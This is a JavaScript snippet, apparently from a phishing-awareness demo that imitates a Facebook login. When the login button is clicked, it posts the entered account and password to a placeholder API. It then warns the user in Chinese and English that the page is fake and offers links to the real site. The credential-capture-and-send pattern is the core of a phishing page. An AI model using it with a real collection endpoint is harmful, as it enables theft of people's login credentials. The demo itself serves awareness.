$("#login").click(function(){
    console.log({
        account: $("#acc").val(),
        password: $("#pwd").val()
    })
    $.post("https://jsonplaceholder.typicode.com/posts",
    {
        account: $("#acc").val(),
        password: $("#pwd").val()
    },
    function(data, status){
      console.log("Data: " + data + "\nStatus: " + status);
      Swal.fire({
        title: '這是假的!!\nThis is fake!!!',
        text: '注意網址以及貓咪，他們可能會是假的',
        icon: 'error',
        confirmButtonText: '去真的FB',
        showDenyButton: true,
        showCancelButton: true,
        denyButtonText: `去Github看看`
      }).then(function(data) {
          if (data.isConfirmed) {
              location.replace("https://www.facebook.com");
          } else if (data.isDenied) {
              location.replace("https://github.com/treeleaves30760/FakeFaceBook")
          }
      })
    })
});